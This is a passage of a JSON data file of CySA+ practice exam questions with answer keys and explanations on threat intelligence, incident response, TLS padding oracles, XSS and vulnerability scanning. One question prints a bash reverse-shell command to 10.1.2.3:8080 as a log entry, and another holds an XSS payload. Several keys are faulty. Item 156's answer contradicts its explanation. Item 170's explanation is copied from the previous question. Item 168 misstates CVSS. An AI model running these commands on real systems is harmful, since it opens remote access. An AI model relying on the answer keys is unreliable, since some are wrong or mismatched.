    "explanation": "The correct answer is B. It proactively facilitates real-time information sharing between the public\nand private sectors.\nTAXII, or Trusted Automated eXchange of Intelligence Information, is a standard protocol for sharing\ncyber threat intelligence in a standardized, automated, and secure manner. TAXII defines how cyber\nthreat information can be shared via services and message exchanges, such as discovery, collection\nmanagement, inbox, and poll. TAXII is designed to support STIX, or Structured Threat Information\neXpression, which is a standardized language for describing cyber threat information in a readable\nand consistent format. Together, STIX and TAXII form a framework for sharing and using threat\nintelligence, creating an open-source platform that allows users to search through records containing\nattack vectors details such as malicious IP addresses, malware signatures, and threat actors123.\nThe importance of implementing TAXII as part of a threat intelligence program is that it proactively\nfacilitates real-time information sharing between the public and private sectors. By using TAXII,\norganizations can exchange cyber threat information with various entities, such as security vendors,\ngovernment agencies, industry associations, or trusted groups. TAXII enables different sharing\nmodels, such as hub and spoke, source/subscriber, or peer-to-peer, depending on the needs and\npreferences of the information producers and consumers. TAXII also supports different levels of\naccess control, encryption, and authentication to ensure the security and privacy of the shared\ninformation123.\nBy implementing TAXII as part of a threat intelligence program, organizations can benefit from the\nfollowing advantages:\nThey can receive timely and relevant information about the latest threats and vulnerabilities that\nmay affect their systems or networks.\nThey can leverage the collective knowledge and experience of other organizations that have faced\nsimilar or related threats.\nThey can improve their situational awareness and threat detection capabilities by correlating and\nanalyzing the shared information.\nThey can enhance their incident response and mitigation strategies by applying the best practices\nand recommendations from the shared information.\nThey can contribute to the overall improvement of cyber security by sharing their own insights and\nfeedback with other organizations123.\nThe other options are incorrect because they do not accurately describe the importance of\nimplementing TAXII as part of a threat intelligence program.\nOption A is incorrect because TAXII does not provide a structured way to gain information about\ninsider threats. Insider threats are malicious activities conducted by authorized users within an\norganization, such as employees, contractors, or partners. Insider threats can be detected by using\nvarious methods, such as user behavior analysis, data loss prevention, or anomaly detection.\nHowever, TAXII is not designed to collect or share information about insider threats specifically. TAXII\nis more focused on external threats that originate from outside sources, such as hackers,\ncybercriminals, or nation-states4.\nOption C is incorrect because TAXII does not exchange messages in the most cost-effective way and\nrequires little maintenance once implemented. TAXII is a protocol that defines how messages are\nexchanged, but it does not specify the cost or maintenance of the exchange. The cost and\nmaintenance of implementing TAXII depend on various factors, such as the type and number of\nservices used, the volume and frequency of data exchanged, the security and reliability requirements\nof the exchange, and the availability and compatibility of existing tools and platforms. Implementing\nTAXII may require significant resources and efforts from both the information producers and\nconsumers to ensure its functionality and performance5.\nOption D is incorrect because TAXII is not a semi-automated solution to gather threat intelligence\nabout competitors in the same sector. TAXII is a fully automated solution that enables the exchange\nof threat intelligence among various entities across different sectors. TAXII does not target or collect\ninformation about specific competitors in the same sector. Rather, it aims to foster collaboration and\ncooperation among organizations that share common interests or goals in cyber security. Moreover,\ngathering threat intelligence about competitors in the same sector may raise ethical and legal issues\nthat are beyond the scope of TAXII.\nReference:\n1 What is STIX/TAXII? | Cloudflare\n2 What Are STIX/TAXII Standards? - Anomali Resources\n3 What is STIX and TAXII? - EclecticIQ\n4 What Is an Insider Threat? Definition & Examples | Varonis\n5 Implementing STIX/TAXII - GitHub Pages\n[6] Cyber Threat Intelligence: Ethical Hacking vs Unethical Hacking | Infosec",
    "image": null
  },
  {
    "id": "q-jc-155",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "During a recent site survey. an analyst discovered a rogue wireless access point on the network.\nWhich of the following actions should be taken first to protect the network while preserving\nevidence?",
    "options": [
      "A. Run a packet sniffer to monitor traffic to and from the access point.",
      "B. Connect to the access point and examine its log files.",
      "C. Identify who is connected to the access point and attempt to find the attacker.",
      "D. Disconnect the access point from the network"
    ],
    "answer": "D",
    "explanation": "The correct answer is D. Disconnect the access point from the network.\nA rogue access point is a wireless access point that has been installed on a network without the\nauthorization or knowledge of the network administrator. A rogue access point can pose a serious\nsecurity risk, as it can allow unauthorized users to access the network, intercept network traffic, or\nlaunch attacks against the network or its devices1234.\nThe first action that should be taken to protect the network while preserving evidence is to\ndisconnect the rogue access point from the network. This will prevent any further damage or\ncompromise of the network by blocking the access point from communicating with other devices or\nusers. Disconnecting the rogue access point will also preserve its state and configuration, which can\nbe useful for forensic analysis and investigation. Disconnecting the rogue access point can be done\nphysically by unplugging it from the network port or wirelessly by disabling its radio frequency5.\nThe other options are not the best actions to take first, as they may not protect the network or\npreserve evidence effectively.\nOption A is not the best action to take first, as running a packet sniffer to monitor traffic to and from\nthe access point may not stop the rogue access point from causing harm to the network. A packet\nsniffer is a tool that captures and analyzes network packets, which are units of data that travel across\na network. A packet sniffer can be useful for identifying and troubleshooting network problems, but\nit may not be able to prevent or block malicious traffic from a rogue access point. Moreover, running\na packet sniffer may require additional time and resources, which could delay the response and\nmitigation of the incident5.\nOption B is not the best action to take first, as connecting to the access point and examining its log\nfiles may not protect the network or preserve evidence. Connecting to the access point may expose\nthe analyst’s device or credentials to potential attacks or compromise by the rogue access point.\nExamining its log files may provide some information about the origin and activity of the rogue\naccess point, but it may also alter or delete some evidence that could be useful for forensic analysis\nand investigation. Furthermore, connecting to the access point and examining its log files may not\nprevent or stop the rogue access point from continuing to harm the network5.\nOption C is not the best action to take first, as identifying who is connected to the access point and\nattempting to find the attacker may not protect the network or preserve evidence. Identifying who is\nconnected to the access point may require additional tools or techniques, such as scanning for\nwireless devices or analyzing network traffic, which could take time and resources away from\nresponding and mitigating the incident. Attempting to find the attacker may also be difficult or\nimpossible, as the attacker may use various methods to hide their identity or location, such as\nencryption, spoofing, or proxy servers. Moreover, identifying who is connected to the access point\nand attempting to find the attacker may not prevent or stop the rogue access point from causing\nfurther damage or compromise to the network5.\nReference:\n1 CompTIA Cybersecurity Analyst (CySA+) Certification Exam Objectives\n2 Cybersecurity Analyst+ - CompTIA\n3 CompTIA CySA+ CS0-002 Certification Study Guide\n4 CertMaster Learn for CySA+ Training - CompTIA\n5 How to Protect Against Rogue Access Points on Wi-Fi - Byos\n6 Wireless Access Point Protection: 5 Steps to Find Rogue Wi-Fi Networks …\n7 Rogue Access Point - Techopedia\n8 Rogue access point - Wikipedia\n9 What is a Rogue Access Point (Rogue AP)? - Contextual Security",
    "image": null
  },
  {
    "id": "q-jc-156",
    "type": "mcq",
    "multiSelect": true,
    "selectCount": 2,
    "domain": "Domain 1.0: Security Operations",
    "question": "While a security analyst for an organization was reviewing logs from web servers. the analyst found\nseveral successful attempts to downgrade HTTPS sessions to use cipher modes of operation\nsusceptible to padding oracle attacks. Which of the following combinations of configuration changes\nshould the organization make to remediate this issue? (Select two).",
    "options": [
      "A. Configure the server to prefer TLS 1.3.",
      "B. Remove cipher suites that use CBC mode.",
      "C. Configure the server to prefer ephemeral modes for key exchange.",
      "D. Require client browsers to present a user certificate for mutual authentication.",
      "E. Configure the server to require HSTS.",
      "F. Remove cipher suites that use GCM."
    ],
    "answer": [
      "A",
      "C"
    ],
    "explanation": "The correct answer is\nA. Configure the server to prefer TLS 1.3 and B. Remove cipher suites that use CBC.\nA padding oracle attack is a type of attack that exploits the padding validation of a cryptographic\nmessage to decrypt the ciphertext without knowing the key. A padding oracle is a system that\nresponds to queries about whether a message has a valid padding or not, such as a web server that\nreturns different error messages for invalid padding or invalid MAC. A padding oracle attack can be\napplied to the CBC mode of operation, where the attacker can manipulate the ciphertext blocks and\nuse the oracle’s responses to recover the plaintext12.\nTo remediate this issue, the organization should make the following configuration changes:\nConfigure the server to prefer TLS 1.3. TLS 1.3 is the latest version of the Transport Layer Security\nprotocol, which provides secure communication between clients and servers. TLS 1.3 has several\nsecurity improvements over previous versions, such as:\nIt deprecates weak and obsolete cryptographic algorithms, such as RC4, MD5, SHA-1, DES, 3DES, and\nCBC mode.\nIt supports only strong and modern cryptographic algorithms, such as AES-GCM, ChaCha20-\nPoly1305, and SHA-256/384.\nIt reduces the number of round trips required for the handshake protocol, which improves\nperformance and latency.\nIt encrypts more parts of the handshake protocol, which enhances privacy and confidentiality.\nIt introduces a zero round-trip time (0-RTT) mode, which allows resuming previous sessions without\nadditional round trips.\nIt supports forward secrecy by default, which means that compromising the long-term keys does not\naffect the security of past sessions3456.\nRemove cipher suites that use CBC. Cipher suites are combinations of cryptographic algorithms that\nspecify how TLS connections are secured. Cipher suites that use CBC mode are vulnerable to padding\noracle attacks, as well as other attacks such as BEAST and Lucky 13. Therefore, they should be\nremoved from the server’s configuration and replaced with cipher suites that use more secure\nmodes of operation, such as GCM or CCM78.\nThe other options are not effective or necessary to remediate this issue.\nOption C is not effective because configuring the server to prefer ephemeral modes for key exchange\ndoes not prevent padding oracle attacks. Ephemeral modes for key exchange are methods that\ngenerate temporary and random keys for each session, such as Diffie-Hellman or Elliptic Curve Diffie-\nHellman. Ephemeral modes provide forward secrecy, which means that compromising the long-term\nkeys does not affect the security of past sessions. However, ephemeral modes do not protect against\npadding oracle attacks, which exploit the padding validation of the ciphertext rather than the key\nexchange9.\nOption D is not necessary because requiring client browsers to present a user certificate for mutual\nauthentication does not prevent padding oracle attacks. Mutual authentication is a process that\nverifies the identity of both parties in a communication, such as using certificates or passwords.\nMutual authentication enhances security by preventing impersonation or spoofing attacks. However,\nmutual authentication does not protect against padding oracle attacks, which exploit the padding\nvalidation of the ciphertext rather than the authentication.\nOption E is not necessary because configuring the server to require HSTS does not prevent padding\noracle attacks. HSTS stands for HTTP Strict Transport Security and it is a mechanism that forces\nbrowsers to use HTTPS connections instead of HTTP connections when communicating with a web\nserver. HSTS enhances security by preventing downgrade or man-in-the-middle attacks that try to\nintercept or modify HTTP traffic. However, HSTS does not protect against padding oracle attacks,\nwhich exploit the padding validation of HTTPS traffic rather than the protocol.\nOption F is not effective because removing cipher suites that use GCM does not prevent padding\noracle attacks. GCM stands for Galois/Counter Mode and it is a mode of operation that provides both\nencryption and authentication for block ciphers, such as AES. GCM is more secure and efficient than\nCBC mode, as it prevents various types of attacks, such as padding oracle, BEAST, Lucky 13, and IV\nreuse attacks. Therefore, removing cipher suites that use GCM would reduce security rather than\nenhance it .\nReference:\n1 Padding oracle attack - Wikipedia\n2 flast101/padding-oracle-attack-explained - GitHub\n3 A Cryptographic Analysis of the TLS 1.3 Handshake Protocol | Journal of Cryptology\n4 Which block cipher mode of operation does TLS 1.3 use? - Cryptography Stack Exchange\n5 The Essentials of Using an Ephemeral Key Under TLS 1.3\n6 Guidelines for the Selection, Configuration, and Use of … - NIST\n7 CBC decryption vulnerability - .NET | Microsoft Learn\n8 The Padding Oracle Attack | Robert Heaton\n9 What is Ephemeral Diffie-Hellman? | Cloudflare\n[10] What is Mutual TLS? How mTLS Authentication Works | Cloudflare\n[11] What is HSTS? HTTP Strict Transport Security Explained | Cloudflare\n[12] Galois/Counter Mode - Wikipedia\n[13] AES-GCM and its IV/nonce value - Cryptography Stack Exchange",
    "image": null
  },
  {
    "id": "q-jc-157",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "An analyst views the following log entries:\nThe organization has a partner vendor with hosts in the 216.122.5.x range. This partner vendor is\nrequired to have access to monthly reports and is the only external vendor with authorized access.\nThe organization prioritizes incident investigation according to the following hierarchy: unauthorized\ndata disclosure is more critical than denial of service attempts.\nwhich are more important than ensuring vendor data access.\nBased on the log files and the organization's priorities, which of the following hosts warrants\nadditional investigation?",
    "options": [
      "A. 121.19.30.221",
      "B. 134.17.188.5",
      "C. 202.180.1582",
      "D. 216.122.5.5"
    ],
    "answer": "A",
    "explanation": "The correct answer is A. 121.19.30.221.\nBased on the log files and the organization’s priorities, the host that warrants additional investigation\nis 121.19.30.221, because it is the only host that accessed a file containing sensitive data and is not\nfrom the partner vendor’s range.\nThe log files show the following information:\nThe IP addresses of the hosts that accessed the web server\nThe date and time of the access\nThe file path of the requested resource\nThe number of bytes transferred\nThe organization’s priorities are:\nUnauthorized data disclosure is more critical than denial of service attempts\nDenial of service attempts are more important than ensuring vendor data access\nAccording to these priorities, the most serious threat to the organization is unauthorized data\ndisclosure, which occurs when sensitive, protected, or confidential data is copied, transmitted,\nviewed, stolen, altered, or used by an individual unauthorized to do so123. Therefore, the host that\naccessed a file containing sensitive data and is not from the partner vendor’s range poses the highest\nrisk to the organization.\nThe file that contains sensitive data is /reports/2023/financials.pdf, as indicated by its name and\npath. This file was accessed by two hosts: 121.19.30.221 and 216.122.5.5. However, only\n121.19.30.221 is not from the partner vendor’s range, which is 216.122.5.x. Therefore, 121.19.30.221\nis a potential unauthorized data disclosure threat and warrants additional investigation.\nThe other hosts do not warrant additional investigation based on the log files and the organization’s\npriorities.\nHost 134.17.188.5 accessed /index.html multiple times in a short period of time, which could\nindicate a denial of service attempt by flooding the web server with requests45. However, denial of\nservice attempts are less critical than unauthorized data disclosure according to the organization’s\npriorities, and there is no evidence that this host succeeded in disrupting the web server’s normal\noperations.\nHost 202.180.1582 accessed /images/logo.png once, which does not indicate any malicious activity\nor threat to the organization.\nHost 216.122.5.5 accessed /reports/2023/financials.pdf once, which could indicate unauthorized\ndata disclosure if it was not authorized to do so. However, this host is from the partner vendor’s\nrange, which is required to have access to monthly reports and is the only external vendor with\nauthorized access according to the organization’s requirements.\nTherefore, based on the log files and the organization’s priorities, host 121.19.30.221 warrants\nadditional investigation as it poses the highest risk of unauthorized data disclosure to the\norganization.",
    "image": "images/page_126_img_2.jpeg"
  },
  {
    "id": "q-jc-158",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "An analyst is conducting monitoring against an authorized team that win perform adversarial\ntechniques. The analyst interacts with the team twice per day to set the stage for the techniques to\nbe used. Which of the following teams is the analyst a member of?",
    "options": [
      "A. Orange team",
      "B. Blue team",
      "C. Red team",
      "D. Purple team"
    ],
    "answer": "A",
    "explanation": "Official JustCerts CompTIA CySA+ CS0-003 question solution.",
    "image": null
  },
  {
    "id": "q-jc-159",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "An employee is no longer able to log in to an account after updating a browser. The employee usually\nhas several tabs open in the browser. Which of\nthe following attacks was most likely performed?",
    "options": [
      "A. RFI",
      "B. LFI",
      "C. CSRF",
      "D. XSS"
    ],
    "answer": "C",
    "explanation": "The most likely attack that was performed is CSRF (Cross-Site Request Forgery). This is an attack that\nforces a user to execute unwanted actions on a web application in which they are currently\nauthenticated1. If the user has several tabs open in the browser, one of them might contain a\nmalicious link or form that sends a request to the web application to change the user’s password,\nemail address, or other account settings. The web application will not be able to distinguish between\nthe legitimate requests made by the user and the forged requests made by the attacker. As a result,\nthe user will lose access to their account.\nTo prevent CSRF attacks, web applications should implement some form of anti-CSRF tokens or other\nmechanisms that validate the origin and integrity of the requests2. These tokens are unique and\nunpredictable values that are generated by the server and embedded in the forms or URLs that\nperform state-changing actions. The server will then verify that the token received from the client\nmatches the token stored on the server before processing the request. This way, an attacker cannot\nforge a valid request without knowing the token value.\nSome other possible attacks that are not relevant to this scenario are:\nRFI (Remote File Inclusion) is an attack that allows an attacker to execute malicious code on a web\nserver by including a remote file in a script. This attack does not affect the user’s browser or account\nsettings.\nLFI (Local File Inclusion) is an attack that allows an attacker to read or execute local files on a web\nserver by manipulating the input parameters of a script. This attack does not affect the user’s\nbrowser or account settings.\nXSS (Cross-Site Scripting) is an attack that injects malicious code into a web page that is then\nexecuted by the user’s browser. This attack can affect the user’s browser or account settings, but it\nrequires the user to visit a compromised web page or click on a malicious link. It does not depend on\nhaving several tabs open in the browser.",
    "image": null
  },
  {
    "id": "q-jc-160",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 4.0: Reporting and Communication",
    "question": "The Chief Executive Officer (CEO) has notified that a confidential trade secret has been compromised.\nWhich of the following communication plans should the CEO initiate?",
    "options": [
      "A. Alert department managers to speak privately with affected staff.",
      "B. Schedule a press release to inform other service provider customers of the compromise.",
      "C. Disclose to all affected parties in the Chief Operating Officer for discussion and resolution.",
      "D. Verify legal notification requirements of PII and SPII in the legal and human resource departments."
    ],
    "answer": "D",
    "explanation": "If a compromise occurs, the CEO must initiate plans to verify regulatory and legal notification requirements for sensitive data (PII and SPII) with the legal and human resource departments. This ensures compliance with state, federal, or international breach notification laws (such as GDPR or HIPAA) regarding data exposure.",
    "image": null
  },
  {
    "id": "q-jc-161",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 3.0: Incident Response and Management",
    "question": "During an incident, analysts need to rapidly investigate by the investigation and leadership teams.\nWhich of the following best describes how PII should be safeguarded during an incident?",
    "options": [
      "A. Implement data encryption and close the data so only the company has access.",
      "B. Ensure permissions are limited in the investigation team and encrypt the data.",
      "C. Implement data encryption and create a standardized procedure for deleting data that is no longer\nneeded.",
      "D. Ensure that permissions are open only to the company."
    ],
    "answer": "B",
    "explanation": "The best option to safeguard PII during an incident is to ensure permissions are limited in the\ninvestigation team and encrypt the data. This is because limiting permissions reduces the risk of\nunauthorized access or leakage of sensitive data, and encryption protects the data from being read\nor modified by anyone who does not have the decryption key. Option A is not correct because closing\nthe data may hinder the investigation process and prevent collaboration with other parties who may\nneed access to the data. Option C is not correct because deleting data that is no longer needed may\nviolate legal or regulatory requirements for data retention, and may also destroy potential evidence\nfor the incident. Option D is not correct because opening permissions to the company may expose\nthe data to more people than necessary, increasing the risk of compromise or misuse.\nReference: CompTIA CySA+ Study Guide: Exam CS0-002, 2nd Edition, Chapter 4, “Data Protection and\nPrivacy Practices”, page 195; CompTIA CySA+ Certification Exam Objectives Version 4.0, Domain 4.0\n“Compliance and Assessment”, Objective 4.1 “Given a scenario, analyze data as part of a security\nincident”, Sub-objective “Data encryption”, page 23\n: CompTIA CySA+ Study Guide: Exam CS0-002, 2nd Edition : CompTIA CySA+ Certification Exam\nObjectives Version 4.0.pdf)",
    "image": null
  },
  {
    "id": "q-jc-162",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "A security analyst is reviewing the logs of a web server and notices that an attacker has attempted to\nexploit a SQL injection vulnerability. Which of the following tools can the analyst use to analyze the\nattack and prevent future attacks?",
    "options": [
      "A. A web application firewall",
      "B. A network intrusion detection system",
      "C. A vulnerability scanner",
      "D. A web proxy"
    ],
    "answer": "A",
    "explanation": "A web application firewall (WAF) is a tool that can protect web servers from attacks such as SQL\ninjection, cross-site scripting, and other web-based threats. A WAF can filter, monitor, and block\nmalicious HTTP traffic before it reaches the web server. A WAF can also be configured with rules and\npolicies to detect and prevent specific types of attacks.\nReference: CompTIA CySA+ Study Guide: Exam CS0-002, 2nd Edition, Chapter 3, “Security\nArchitecture and Tool Sets”, page 91; CompTIA CySA+ Certification Exam Objectives Version 4.0,\nDomain 1.0 “Threat and Vulnerability Management”, Objective 1.2 “Given a scenario, analyze the\nresults of a network reconnaissance”, Sub-objective “Web application attacks”, page 9\n: CompTIA CySA+ Study Guide: Exam CS0-002, 2nd Edition : CompTIA CySA+ Certification Exam\nObjectives Version 4.0.pdf)",
    "image": null
  },
  {
    "id": "q-jc-163",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "Which Of the following techniques would be best to provide the necessary assurance for embedded\nsoftware that drives centrifugal pumps at a power Plant?",
    "options": [
      "A. Containerization",
      "B. Manual code reviews",
      "C. Static and dynamic analysis",
      "D. Formal methods"
    ],
    "answer": "D",
    "explanation": "According to the CompTIA CySA+ Study Guide: Exam CS0-003, 3rd Edition1, the best technique to\nprovide the necessary assurance for embedded software that drives centrifugal pumps at a power\nplant is formal methods. Formal methods are a rigorous and mathematical approach to software\ndevelopment and verification, which can ensure the correctness and reliability of critical software\nsystems. Formal methods can be used to specify, design, implement, and verify embedded software\nusing formal languages, logics, and tools1.\nContainerization, manual code reviews, and static and dynamic analysis are also useful techniques\nfor software assurance, but they are not as rigorous or comprehensive as formal methods.\nContainerization is a method of isolating and packaging software applications with their\ndependencies, which can improve security, portability, and scalability. Manual code reviews are a\nprocess of examining the source code of a software program by human reviewers, which can help\nidentify errors, vulnerabilities, and compliance issues. Static and dynamic analysis are techniques of\ntesting and evaluating software without executing it (static) or while executing it (dynamic), which\ncan help detect bugs, defects, and performance issues1.",
    "image": "images/page_133_img_2.jpeg"
  },
  {
    "id": "q-jc-164",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "A security team identified several rogue Wi-Fi access points during the most recent network scan.\nThe network scans occur once per quarter. Which of the following controls would best all ow the\norganization to identity rogue\ndevices more quickly?",
    "options": [
      "A. Implement a continuous monitoring policy.",
      "B. Implement a BYOD policy.",
      "C. Implement a portable wireless scanning policy.",
      "D. Change the frequency of network scans to once per month."
    ],
    "answer": "A",
    "explanation": "The best control to allow the organization to identify rogue devices more quickly is \nA. Implement a continuous monitoring policy. A continuous monitoring policy is a set of procedures\nand tools that enable an organization to detect and respond to unauthorized or anomalous activities\non its network in real time or near real time. A continuous monitoring policy can help identify rogue\naccess points as soon as they appear on the network, rather than waiting for quarterly or monthly\nscans. A continuous monitoring policy can also help improve the overall security posture and\ncompliance of the organization by providing timely and accurate information about its network\nassets, vulnerabilities, threats, and incidents1.",
    "image": "images/page_133_img_2.jpeg"
  },
  {
    "id": "q-jc-165",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "An analyst needs to provide recommendations based on a recent vulnerability scan:\nWhich of the following should the analyst recommend addressing to ensure potential vulnerabilities\nare identified?",
    "options": [
      "A. SMB use domain SID to enumerate users",
      "B. SYN scanner",
      "C. SSL certificate cannot be trusted",
      "D. Scan not performed with admin privileges"
    ],
    "answer": "D",
    "explanation": "This is because scanning without admin privileges can limit the scope and accuracy of the\nvulnerability scan, and potentially miss some critical vulnerabilities that require higher privileges to\ndetect. According to the OWASP Vulnerability Management Guide1, “scanning without\nadministrative privileges will result in a large number of false negatives and an incomplete scan”.\nTherefore, the analyst should recommend addressing this issue to ensure potential vulnerabilities\nare identified.",
    "image": "images/page_133_img_2.jpeg"
  },
  {
    "id": "q-jc-166",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "A security analyst recently used Arachni to perform a vulnerability assessment of a newly developed\nweb application. The analyst is concerned about the following output:\n[+] XSS: In form input 'txtSearch' with action https://localhost/search.aspx\n[-] XSS: Analyzing response #1...\n[-] XSS: Analyzing response #2...\n[-] XSS: Analyzing response #3...\n[+] XSS: Response is tainted. Looking for proof of the vulnerability.\nWhich of the following is the most likely reason for this vulnerability?",
    "options": [
      "A. The developer set input validation protection on the specific field of search.aspx.",
      "B. The developer did not set proper cross-site scripting protections in the header.",
      "C. The developer did not implement default protections in the web application build.",
      "D. The developer did not set proper cross-site request forgery protections."
    ],
    "answer": "B",
    "explanation": "The most likely reason for this vulnerability is B. The developer did not set proper cross-site scripting\nprotections in the header. Cross-site scripting (XSS) is a type of web application vulnerability that\nallows an attacker to inject malicious code into a web page that is viewed by other users. XSS can be\nused to steal cookies, session tokens, credentials, or other sensitive information, or to perform\nactions on behalf of the victim1.\nOne of the common ways to prevent XSS attacks is to set proper HTTP response headers that instruct\nthe browser how to handle the content of the web page. For example, the Content-Type header can\nspecify the MIME type and character encoding of the web page, which can help the browser avoid\ninterpreting data as code. The X-XSS-Protection header can enable or disable the browser’s built-in\nXSS filter, which can block or sanitize suspicious scripts. The Content-Security-Policy header can\ndefine a whitelist of sources and directives that control what resources and scripts can be loaded or\nexecuted on the web page2.\nAccording to the output of Arachni, a web application security scanner framework3, it detected an\nXSS vulnerability in the form input ‘txtSearch’ with action https://localhost/search.aspx. This means\nthat Arachni was able to inject a malicious script into the input field and observe its execution in the\nresponse. This indicates that the developer did not set proper cross-site scripting protections in the\nheader of search.aspx, which allowed Arachni to bypass the browser’s default security mechanisms\nand execute arbitrary code on the web page.",
    "image": "images/page_133_img_2.jpeg"
  },
  {
    "id": "q-jc-167",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "A security analyst found the following vulnerability on the company’s website:\n<INPUT TYPE=“IMAGE” SRC=“javascript:alert(‘test’);”>\nWhich of the following should be implemented to prevent this type of attack in the future?",
    "options": [
      "A. Input sanitization",
      "B. Output encoding",
      "C. Code obfuscation",
      "D. Prepared statements"
    ],
    "answer": "A",
    "explanation": "This is a type of web application vulnerability called cross-site scripting (XSS), which allows an\nattacker to inject malicious code into a web page that is viewed by other users. XSS can be used to\nsteal cookies, session tokens, credentials, or other sensitive information, or to perform actions on\nbehalf of the victim.\nInput sanitization is a technique that prevents XSS attacks by checking and filtering the user input\nbefore processing it. Input sanitization can remove or encode any characters or strings that may be\ninterpreted as code by the browser, such as <, >, \", ', or javascript:. Input sanitization can also validate\nthe input against a predefined format or range of values, and reject any input that does not match.\nOutput encoding is a technique that prevents XSS attacks by encoding the output before sending it to\nthe browser. Output encoding can convert any characters or strings that may be interpreted as code\nby the browser into harmless entities, such as <, >, \", ', or javascript:. Output encoding can also\nescape any special characters that may have a different meaning in different contexts, such as , /, or\n;.\nCode obfuscation is a technique that makes the source code of a web application more difficult to\nread and understand by humans. Code obfuscation can use techniques such as renaming variables\nand functions, removing comments and whitespace, replacing literals with expressions, or adding\ndummy code. Code obfuscation can help protect the intellectual property and trade secrets of a web\napplication, but it does not prevent XSS attacks.",
    "image": "images/page_135_img_2.jpeg"
  },
  {
    "id": "q-jc-168",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "A cryptocurrency service company is primarily concerned with ensuring the accuracy of the data on\none of its systems. A security analyst has been tasked with prioritizing vulnerabilities for remediation\nfor the system. The analyst will use the following CVSSv3.1 impact metrics for prioritization:\nWhich of the following vulnerabilities should be prioritized for remediation?",
    "options": [
      "A. Availability",
      "B. Integrity",
      "C. Confidentiality",
      "D. Non-repudiation"
    ],
    "answer": "B",
    "explanation": "Vulnerability 2 has the highest impact metrics, specifically the highest attack vector (AV) and attack\ncomplexity (AC) values. This means that the vulnerability is more likely to be exploited and more\ndifficult to remediate.\nReference:\nCVSS v3.1 Specification Document, section 2.1.1 and 2.1.2\nThe CVSS v3 Vulnerability Scoring System, section 3.1 and 3.2",
    "image": "images/page_135_img_2.jpeg"
  },
  {
    "id": "q-jc-169",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "A security analyst needs to mitigate a known, exploited vulnerability related not\ntack vector that embeds software through the USB interface. Which of the following should the\nanalyst do first?",
    "options": [
      "A. Conduct security awareness training on the risks of using unknown and unencrypted USBs.",
      "B. Write a removable media policy that explains that USBs cannot be connected to a company asset.",
      "C. Check configurations to determine whether USB ports are enabled on company assets.",
      "D. Review logs to see whether this exploitable vulnerability has already impacted the company."
    ],
    "answer": "C",
    "explanation": "USB ports are a common attack vector that can be used to deliver malware, steal data, or\ncompromise systems. The first step to mitigate this vulnerability is to check the configurations of the\ncompany assets and disable or restrict the USB ports if possible. This will prevent unauthorized\ndevices from being connected and reduce the attack surface. The other options are also important,\nbut they are not the first priority in this scenario.\nReference:\nCompTIA CySA+ CS0-003 Certification Study Guide, page 247\nWhat are Attack Vectors: Definition & Vulnerabilities, section “How to secure attack vectors”\nAre there any attack vectors for a printer connected through USB in a Windows environment?,\nanswer by user “schroeder”",
    "image": null
  },
  {
    "id": "q-jc-170",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 2.0: Vulnerability Management",
    "question": "A company is deploying new vulnerability scanning software to assess its systems. The current\nnetwork is highly segmented, and the networking team wants to minimize the number of unique\nfirewall rules. Which of the following scanning techniques would be most efficient to achieve the\nobjective?",
    "options": [
      "A. Deploy agents on all systems to perform the scans.",
      "B. Deploy a central scanner and perform non-credentialed scans.",
      "C. Deploy a cloud-based scanner and perform a network scan.",
      "D. Deploy a scanner sensor on every segment and perform credentialed scans."
    ],
    "answer": "A",
    "explanation": "USB ports are a common attack vector that can be used to deliver malware, steal data, or\ncompromise systems. The first step to mitigate this vulnerability is to check the configurations of the\ncompany assets and disable or restrict the USB ports if possible. This will prevent unauthorized\ndevices from being connected and reduce the attack surface. The other options are also important,\nbut they are not the first priority in this scenario.\nReference:\nCompTIA CySA+ CS0-003 Certification Study Guide, page 247\nWhat are Attack Vectors: Definition & Vulnerabilities, section “How to secure attack vectors”\nAre there any attack vectors for a printer connected through USB in a Windows environment?,\nanswer by user “schroeder”",
    "image": null
  },
  {
    "id": "q-jc-171",
    "type": "mcq",
    "multiSelect": false,
    "selectCount": 1,
    "domain": "Domain 1.0: Security Operations",
    "question": "A security analyst identified the following suspicious entry on the host-based IDS logs:\nbash -i >& /dev/tcp/10.1.2.3/8080 0>&1\nWhich of the following shell scripts should the analyst use to most accurately confirm if the activity is\nongoing?",
    "options": [
      "A. #!/bin/bash\nnc 10.1.2.3 8080 -vv >dev/null && echo \"Malicious activity\" Il echo \"OK\"",
      "B. #!/bin/bash\nps -fea | grep 8080 >dev/null && echo \"Malicious activity\" I| echo \"OK\"",
      "C. #!/bin/bash\nls /opt/tcp/10.1.2.3/8080 >dev/null && echo \"Malicious activity\" I| echo \"OK\"",
      "D. #!/bin/bash\nnetstat -antp Igrep 8080 >dev/null && echo \"Malicious activity\" I| echo \"OK\""
    ],
    "answer": "D",
